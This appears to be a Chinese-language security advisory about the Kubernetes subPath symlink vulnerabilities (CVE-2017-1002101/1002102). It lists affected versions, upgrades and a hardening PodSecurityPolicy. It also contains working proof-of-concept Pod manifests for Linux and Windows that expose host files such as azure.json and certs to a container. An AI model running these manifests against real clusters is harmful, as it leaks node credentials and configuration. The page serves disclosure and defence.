---
type: page
title: Kubernetes 任意文件访问漏洞
date: 2018-03-21 20:17:18
tags: [kubernetes]
---

前段时间 Kubernetes 发布了一系列的安全更新，修复了一个因 subpath 处理不当导致的任意文件访问漏洞（[CVE-2017-1002101](https://github.com/kubernetes/kubernetes/issues/60814)和 [CVE-2017-1002102](https://github.com/kubernetes/kubernetes/issues/60814)）。受该漏洞影响的版本包括

- Kubernetes 1.3.x-1.6.x
- Kubernetes 1.7.0-1.7.13
- Kubernetes 1.8.0-1.8.8
- Kubernetes 1.9.0-1.9.3

建议所有使用 Kubernetes 的生产用户更新到修复版本

- v1.7.14（ [#61047](https://github.com/kubernetes/kubernetes/pull/61047)）
- v1.8.9 （[#61046](https://github.com/kubernetes/kubernetes/pull/61046)）
- v1.9.5 （[#61045](https://github.com/kubernetes/kubernetes/pull/61045) [#61080](https://github.com/kubernetes/kubernetes/pull/61080)，其中 v1.9.4 存在 subPath 无法在 Secret 等 Volume 中使用的问题，建议直接跳过该版本）
- v1.10（将在未来几天发布）

除了升级集群版本之外，建议使用 PodSecurityPolicy 禁止 hostPath 存储卷，如

```yaml
apiVersion: extensions/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
  annotations:
    seccomp.security.alpha.kubernetes.io/allowedProfileNames: 'docker/default'
    apparmor.security.beta.kubernetes.io/allowedProfileNames: 'runtime/default'
    seccomp.security.alpha.kubernetes.io/defaultProfileName:  'docker/default'
    apparmor.security.beta.kubernetes.io/defaultProfileName:  'runtime/default'
spec:
  privileged: false
  # Required to prevent escalations to root.
  allowPrivilegeEscalation: false
  # This is redundant with non-root + disallow privilege escalation,
  # but we can provide it for defense in depth.
  requiredDropCapabilities:
    - ALL
  # Allow core volume types.
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    # Assume that persistentVolumes set up by the cluster admin are safe to use.
    - 'persistentVolumeClaim'
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    # Require the container to run without root privileges.
    rule: 'MustRunAsNonRoot'
  seLinux:
    # This policy assumes the nodes are using AppArmor rather than SELinux.
    rule: 'RunAsAny'
  supplementalGroups:
    rule: 'MustRunAs'
    ranges:
      # Forbid adding the root group.
      - min: 1
        max: 65535
  fsGroup:
    rule: 'MustRunAs'
    ranges:
      # Forbid adding the root group.
      - min: 1
        max: 65535
  readOnlyRootFilesystem: false
```

## 漏洞示例

### Linux

使用 SubPath 和软链接的形式可以访问 Host 上面的任意文件（且适用于任何类型的存储插件）：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: subpath
spec:
  initContainers:
  - name: symlink
    image: "alpine"
    command: ['ln', '-s', '/etc/kubernetes', '/data/vol']
    volumeMounts:
    - name: volume01
      mountPath: /data/
  containers:
  - name: sh
    image: "alpine"
    command: ["sh"]
    stdin: true
    tty: true
    volumeMounts:
    - name: volume01
      subPath: vol
      mountPath: /test
  volumes:
  - name: volume01
    emptyDir: {}
```

```sh
# 可以在 Volume 中看到 Kubernetes 的配置
$ kubectl exec -i -t subpath ls /test
azure.json     certs          manifests      volumeplugins
```

### Windows

使用 SubPath 和软链接的形式可以访问 Host 上面的任意文件（且适用于任何类型的存储插件）：

```sh
apiVersion: v1
kind: Pod
metadata:
  name: subpath-win
spec:
  initContainers:
  - name: symlink
    image: microsoft/iis
    command:
    - cmd.exe
    - /c
    - mklink /J c:\data\kubernetes c:\k
    volumeMounts:
    - name: volume01
      mountPath: /data
  containers:
  - name: cmd
    image: microsoft/iis
    volumeMounts:
    - name: volume01
      subPath: kubernetes
      mountPath: /test
  volumes:
  - name: volume01
    emptyDir: {}
  nodeSelector:
    beta.kubernetes.io/os: windows
```

```sh
# 可以在 Volume 中看到 Kubernetes 的配置
$ kubectl exec -i -t subpath-win powershell ls /test

    Directory: C:\test


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/13/2018   8:13 AM                cni
d-----         3/7/2018   4:43 AM                volumeplugins
-a----         3/7/2018   4:43 AM            635 azure.json
-a----         3/7/2018   4:43 AM           9446 config
```
